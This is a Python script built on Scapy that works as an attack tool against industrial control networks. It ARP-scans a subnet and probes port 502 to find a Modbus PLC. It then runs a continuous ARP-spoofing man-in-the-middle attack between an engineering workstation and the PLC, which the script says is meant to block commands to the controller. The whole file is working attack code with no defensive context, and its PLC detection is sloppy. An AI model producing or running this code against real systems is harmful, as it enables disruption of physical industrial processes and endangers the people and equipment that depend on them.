from scapy.all import ARP, Ether, srp, send
import time
import threading

# Network details
INTERFACE = "eth0"  # Change depending on your network interface
WORKSTATION_IP = "192.168.1.100"  # Replace with known Engineering Workstation IP
SWITCH_IP_RANGE = "192.168.1.1/24"  # Modify based on network range

# Function to find the PLC IP (scans for Modbus TCP devices)
def find_plc_ip():
    print("[*] Scanning for PLCs in the network...")
    plc_ip = None
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=SWITCH_IP_RANGE)
    answered, _ = srp(arp_request, timeout=3, verbose=False)
    
    for sent, received in answered:
        ip = received.psrc
        mac = received.hwsrc
        print(f"[+] Found Device - IP: {ip}, MAC: {mac}")

        # Assuming PLCs use port 502 (Modbus TCP)
        from scapy.layers.inet import IP, TCP
        modbus_probe = IP(dst=ip) / TCP(dport=502, flags="S")
        response = srp(modbus_probe, timeout=2, verbose=False)
        
        if response:
            print(f"[+] PLC detected at IP: {ip}")
            plc_ip = ip
            break

    if not plc_ip:
        print("[-] No PLC found on the network.")
        exit(1)
    
    return plc_ip

# Function to spoof ARP responses (Man-in-the-Middle attack)
def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)

    if not target_mac or not spoof_mac:
        print("[-] Could not obtain MAC addresses!")
        return

    while True:
        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=False)
        send(ARP(op=2, pdst=spoof_ip, psrc=target_ip, hwdst=spoof_mac), verbose=False)
        time.sleep(2)

# Function to get a MAC address from an IP using ARP
def get_mac(ip):
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for sent, received in answered:
        return received.hwsrc
    return None

# Function to start ARP spoofing
def start_attack(plc_ip):
    print(f"[!] Launching ARP Spoofing to block commands to PLC @ {plc_ip}")

    attacker_thread = threading.Thread(target=arp_spoof, args=(WORKSTATION_IP, plc_ip))
    attacker_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Stopping attack and restoring network...")
        restore_network(WORKSTATION_IP, plc_ip)
        restore_network(plc_ip, WORKSTATION_IP)

# Restore network after attack
def restore_network(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=spoof_mac), count=3, verbose=False)

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    start_attack(plc_ip)